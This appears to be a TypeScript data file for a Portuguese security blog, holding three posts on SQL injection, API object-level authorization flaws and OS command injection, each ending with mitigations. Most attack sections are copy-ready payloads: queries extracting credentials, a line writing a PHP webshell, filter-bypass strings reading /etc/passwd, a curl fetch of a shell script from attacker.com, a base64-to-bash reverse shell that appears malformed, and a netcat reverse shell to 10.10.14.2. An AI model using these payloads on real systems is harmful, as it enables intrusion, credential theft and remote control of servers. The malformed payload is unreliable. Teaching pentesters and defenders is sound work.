export interface Post {
  slug: string;
  title: string;
  date: string;
  readTime: string;
  tags: string[];
  excerpt: string;
  category: "Web Security" | "API Security" | "Offensive Security";
  content: {
    intro: string;
    sections: {
      title: string;
      description: string;
      codeBlock?: {
        language: string;
        code: string;
      };
      bulletPoints?: string[];
      callout?: {
        type: "tip" | "warning" | "note";
        text: string;
      };
    }[];
    mitigation: string[];
    conclusion: string;
  };
}

export const POSTS: Post[] = [
  {
    slug: "guia-definitivo-sqli-union-blind-rce",
    title: "Guia Prático de SQL Injection: De UNION-Based a RCE via WebShell",
    date: "2026-09-03",
    readTime: "12 min",
    tags: ["sqli", "rce", "database", "web-security", "pentest"],
    category: "Web Security",
    excerpt: "Metodologia aprofundada de enumeração e exploração de SQL Injection: extração de dados via UNION, bypass de visibilidade com Time-Based Blind e escrita de WebShell para execução de código.",
    content: {
      intro: "O SQL Injection (SQLi) continua sendo uma das falhas com maior poder de impacto em aplicações web. Quando dados fornecidos pelo usuário são concatenados diretamente na consulta SQL sem a devida sanitização ou uso de Prepared Statements, o atacante obtém controle direto sobre a instrução interpretada pelo SGBD. Neste post, dissecamos desde o reconhecimento de colunas até a escalada crítica para Remote Code Execution (RCE).",
      sections: [
        {
          title: "1. Metodologia de Exploração UNION-Based",
          description: "O operador UNION combina a query original da aplicação com uma consulta arbitrária injetada. Para que funcione com sucesso, a query injetada DEVE ter exatamente o mesmo número de colunas e tipos de dados compatíveis com a consulta original.",
          bulletPoints: [
            "Detecção inicial: Forçar erros de sintaxe com aspas simples ('), duplas (\") ou caracteres de escape.",
            "Descoberta do número de colunas: Iterar com ' ORDER BY 1--, ' ORDER BY 2-- até estourar erro de coluna inexistente.",
            "Mapeamento de colunas refletidas: ' UNION SELECT 1, 2, 3, 4-- para identificar onde cada valor aparece na página.",
            "Coleta de metadados: Injetar @@version, database() e user() nos campos refletidos."
          ],
          codeBlock: {
            language: "sql",
            code: "-- Descobrir tabelas do banco atual via information_schema:\n' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() -- -\n\n-- Descobrir colunas da tabela de usuários:\n' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name = 'users' -- -\n\n-- Extração de credenciais:\n' UNION SELECT 1, concat(username, 0x3a, password), 3 FROM users -- -"
          }
        },
        {
          title: "2. Extração Cega: Time-Based Blind SQLi",
          description: "Em cenários onde a aplicação não reflete erros SQL e nem exibe dados diretamente na interface, a vulnerabilidade pode ser explorada medindo o tempo de resposta do servidor. Através de perguntas condicionais verdadeiro/falso com pausas temporais, extraímos dados caractere por caractere.",
          bulletPoints: [
            "SUBSTRING(string, posição, tamanho): Extrai um caractere específico da resposta.",
            "IF(condição, true, false): Avalia a expressão lógica.",
            "SLEEP(segundos): Força o SGBD a pausar caso a condição seja verdadeira."
          ],
          codeBlock: {
            language: "sql",
            code: "-- Teste de hipótese: O primeiro caractere do nome do banco é 'a'?\n' AND IF(SUBSTRING(database(), 1, 1) = 'a', SLEEP(5), 0) -- -\n\n-- Exemplo com benchmark no PostgreSQL / SQLite / MySQL:\n1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1"
          },
          callout: {
            type: "warning",
            text: "A exploração manual de Time-Based Blind é extremamente lenta em redes instáveis. Utilize ferramentas como sqlmap ou scripts Python assíncronos customizados calculando o desvio padrão de latência."
          }
        },
        {
          title: "3. Escalada para RCE via INTO OUTFILE",
          description: "Se a conta do banco possuir privilégios adequados (como o privilégio FILE no MySQL) e o parâmetro secure_file_priv permitir escrita no diretório do servidor web (ex: /var/www/html), podemos gravar uma WebShell diretamente no sistema de arquivos.",
          codeBlock: {
            language: "sql",
            code: "-- Gravando uma WebShell PHP mínima:\n' UNION SELECT null, '<?php system($_GET[\"cmd\"]); ?>', null INTO OUTFILE '/var/www/html/shell.php' -- -\n\n-- Executando comandos via navegador:\nhttp://alvo.com/shell.php?cmd=id"
          },
          callout: {
            type: "tip",
            text: "O comando INTO OUTFILE falha silenciosamente se o arquivo de destino já existir. Sempre gere nomes randômicos e confirme antes o caminho absoluto da raiz web através de erros de LFI, phpinfo() ou arquivos de configuração padrão."
          }
        }
      ],
      mitigation: [
        "Utilizar exclusivamente Consultas Parametrizadas (Prepared Statements / PDO) em todas as camadas de persistência.",
        "Garantir o princípio do menor privilégio para o usuário de banco de dados da aplicação (remover permissões FILE, SUPER, GRANT).",
        "Configurar secure_file_priv = NULL no my.cnf para bloquear despejo e leitura arbitrária de arquivos pelo SGBD.",
        "Implementar Web Application Firewall (WAF) como camada complementar de detecção de assinaturas maliciosas."
      ],
      conclusion: "SQL Injection não é apenas uma ameaça à integridade do banco de dados, mas sim um vetor viável de comprometimento sistêmico completo quando atinge a escrita de arquivos. Compreender cada estágio da exploração é indispensável para construir defesas blindadas e executar pentests eficientes."
    }
  },
  {
    slug: "broken-object-level-authorization-bola-guia-api",
    title: "OWASP API1: Broken Object Level Authorization (BOLA / IDOR)",
    date: "2026-09-03",
    readTime: "10 min",
    tags: ["api-security", "bola", "idor", "owasp-top-10", "authorization"],
    category: "API Security",
    excerpt: "Análise técnica do risco nº 1 do OWASP API Security Top 10. Como a confusão entre autenticação e autorização expõe recursos sensíveis de outros usuários em APIs REST e GraphQL.",
    content: {
      intro: "Broken Object Level Authorization (BOLA), historicamente conhecido como Insecure Direct Object Reference (IDOR), lidera o ranking do OWASP API Security Top 10 por uma razão clara: é frequente, simples de explorar e tem impacto devastador. Ocorre quando uma API expõe um endpoint que manipula um recurso por seu identificador sem validar se o usuário autenticado tem direito legítimo de operar aquele objeto específico.",
      sections: [
        {
          title: "1. Autenticação vs. Autorização: A Raiz do Problema",
          description: "A grande armadilha para times de desenvolvimento é acreditar que exigir um Bearer Token ou cookie de sessão válido no cabeçalho é suficiente para garantir segurança. A autenticação valida apenas 'quem você é', enquanto a autorização define 'o que você pode fazer e sobre quais dados'.",
          bulletPoints: [
            "A API valida a assinatura do token JWT com sucesso.",
            "A query de busca no banco consulta o registro utilizando apenas o ID passado na rota: SELECT * FROM orders WHERE id = :id.",
            "Como o token pertencia ao Usuário A, mas o ID pertencia ao Usuário B, a informação vaza sem disparar erro 403/401."
          ]
        },
        {
          title: "2. Padrões de Endpoints e Vetores de Ataque",
          description: "BOLA não se limita apenas a parâmetros na URL através do método GET. Ele se manifesta em operações destrutivas e alterações cadastrais em massa.",
          codeBlock: {
            language: "http",
            code: "### Cenário 1: Leitura Indevida via Parâmetro de Rota\nGET /api/v1/invoices/10442 HTTP/1.1\nHost: api.empresa.com\nAuthorization: Bearer <TOKEN_VALIDO_DO_USUARIO_A>\n--> Retorna a fatura privada do Usuário B\n\n### Cenário 2: BOLA em Operação Destrutiva (DELETE)\nDELETE /api/v1/workspaces/88/members/501 HTTP/1.1\nHost: api.empresa.com\nAuthorization: Bearer <TOKEN_MEMBRO_COMUM>\n--> Remove membro de outro workspace sem checar hierarquia\n\n### Cenário 3: Manipulação de ID no Corpo JSON (POST / PUT)\nPOST /api/v2/wire-transfer HTTP/1.1\nHost: api.bank.com\nAuthorization: Bearer <TOKEN_VALIDO>\nContent-Type: application/json\n\n{\n  \"origin_account_id\": \"98124\",  // ID manipulado para outra conta\n  \"dest_account_id\": \"12345\",\n  \"amount\": 500.00\n}"
          },
          callout: {
            type: "tip",
            text: "Ao auditar APIs, altere métodos HTTP (ex: de GET para PUT ou DELETE) e tente repassar IDs em cabeçalhos alternativos como X-User-Id ou X-Original-User."
          }
        },
        {
          title: "3. Automação de Testes com ffuf e Burp Suite",
          description: "Para identificar falhas BOLA em larga escala, analistas ofensivos utilizam automação com listas sequenciais ou dicionários de IDs mapeados:",
          codeBlock: {
            language: "bash",
            code: "# Testando enumeração massiva de pedidos com ffuf e token autenticado:\nffuf -u https://api.alvo.com/api/v1/orders/FUZZ \\\n     -w <(seq 1000 2000) \\\n     -H \"Authorization: Bearer SEU_JWT_TOKEN\" \\\n     -mc 200 \\\n     -fs 45 \\\n     -o bola_scan.json"
          }
        }
      ],
      mitigation: [
        "Implementar controle de autorização baseado em contexto no nível do serviço/repositório de dados.",
        "Em vez de buscar por ID isolado, associar sempre à identidade do token: SELECT * FROM documents WHERE id = :doc_id AND user_id = :auth_user_id.",
        "Substituir IDs sequenciais previsíveis (autoincrement) por UUIDs versão 4 (aleatórios e criptograficamente seguros).",
        "Adotar políticas granulares de ABAC (Attribute-Based Access Control) ou RBAC em middlewares de rota."
      ],
      conclusion: "APIs são arquitetadas para interação de máquina para máquina. Não confie em IDs fornecidos pelo cliente sem validação implícita de propriedade em cada operação."
    }
  },
  {
    slug: "command-injection-bypass-filtros-shell",
    title: "Command Injection em Aplicações Web: Técnicas de Exploração e Bypass de Filtros",
    date: "2026-09-03",
    readTime: "11 min",
    tags: ["command-injection", "rce", "linux", "evasion", "bash"],
    category: "Offensive Security",
    excerpt: "Como aplicações vulneráveis executam comandos arbitrários no sistema operacional e quais técnicas avançadas de encoding, separadores e variáveis de ambiente permitem contornar filtros restritivos.",
    content: {
      intro: "Command Injection (ou injeção de comandos de SO) ocorre quando uma aplicação web repassa dados fornecidos pelo usuário para um interpretador de sistema (como bash, sh ou cmd.exe) através de funções como system(), exec() ou popen() sem higienização estrita. A consequência imediata costuma ser o comprometimento total do host através de um acesso inicial como usuário do servidor web (ex: www-data).",
      sections: [
        {
          title: "1. Como Funciona a Quebra de Contexto",
          description: "A aplicação pretende executar um comando pré-definido (por exemplo, testar conectividade de rede com ping ou converter imagens com imagemagick). Se a concatenação for crua, operadores de controle do shell permitem encadear comandos novos.",
          codeBlock: {
            language: "php",
            code: "// Código vulnerável em PHP:\n$ip = $_GET['ip'];\n$output = shell_exec(\"ping -c 1 \" . $ip);\necho \"<pre>$output</pre>\";"
          },
          bulletPoints: [
            "Ponto e vírgula (;): Executa comandos em sequência independentemente do resultado.",
            "AND Lógico (&&): Executa o próximo comando apenas se o anterior retornar status 0 (sucesso).",
            "OR Lógico (||): Executa o segundo comando caso o primeiro falhe.",
            "Pipe (|): Envia a saída padrão do primeiro comando como entrada do segundo.",
            "Subshell ($() ou backticks ``): Executa o comando interno e insere a saída na linha atual."
          ]
        },
        {
          title: "2. Evasão e Bypass de Blacklists Comuns",
          description: "É comum encontrar filtros rudimentares tentando bloquear espaços em branco ou palavras-chave conhecidas (cat, sh, bash). Abaixo estão técnicas consagradas para burlar restrições.",
          codeBlock: {
            language: "bash",
            code: "# 1. Bypass de Espaços em Branco no Linux:\n# Utilizando a variável de ambiente $IFS (Internal Field Separator):\ncat$IFS/etc/passwd\ncurl$IFS$9attacker.com/shell.sh\n\n# Utilizando chaves de agrupamento (Brace Expansion):\n{cat,/etc/passwd}\n\n# 2. Bypass de palavras proibidas (cat, flag, passwd):\n# Concatenação de strings vazias:\nc''a\"\"t /et'c'/pas''swd\n\n# Utilizando wildcard (? ou *):\n/bin/c?t /etc/pass*\n/usr/bin/p*th*n3 -c '...'\n\n# 3. Entrega de Payload Ofuscado via Base64:\necho$IFS'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzkMDAxIDA+JjE='|base64$IFS-d|bash"
          },
          callout: {
            type: "warning",
            text: "Em desafios de CTF e ambientes restritos, variáveis como $PATH e caracteres de expansão como ${PATH:0:1} (que gera a barra '/') são fundamentais quando '/' está bloqueado."
          }
        },
        {
          title: "3. Obtenção de Shell Interativa e TTY Sanitizado",
          description: "Após obter execução inicial via webshell ou injeção cega, o próximo passo operacional é estabelecer uma sessão de reverse shell com TTY estável para viabilizar pós-exploração sem travamentos:",
          codeBlock: {
            language: "bash",
            code: "# 1. No host atacante (listen):\nnc -lvnp 4444\n\n# 2. Payload enviado no alvo:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f\n\n# 3. Upgrade imediato para TTY completo:\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Pressione Ctrl + Z para suspender o netcat\nstty raw -echo; fg\nexport TERM=xterm-256color\nexport SHELL=bash"
          }
        }
      ],
      mitigation: [
        "Evitar a execução de comandos de sistema através de chamadas de shell. Utilizar APIs nativas da linguagem de programação.",
        "Se for inevitável, utilizar bibliotecas que executem o binário diretamente sem instanciar um shell interpretador (ex: subprocess.run(['/bin/ping', '-c', '1', ip]) em Python, onde shell=False por padrão).",
        "Implementar listas brancas (whitelists) estritas de caracteres aceitos (ex: expressões regulares permitindo apenas caracteres alfanuméricos e pontos para endereços IP).",
        "Executar o processo da aplicação em containers isolados com o mínimo de binários disponíveis no sistema operacional."
      ],
      conclusion: "A filtragem de caracteres baseada em listas negras invariavelmente falha devido à rica sintaxe dos interpretadores POSIX. Trate o problema na arquitetura, nunca permitindo que entrada externa atinja um interpretador de comandos."
    }
  }
];
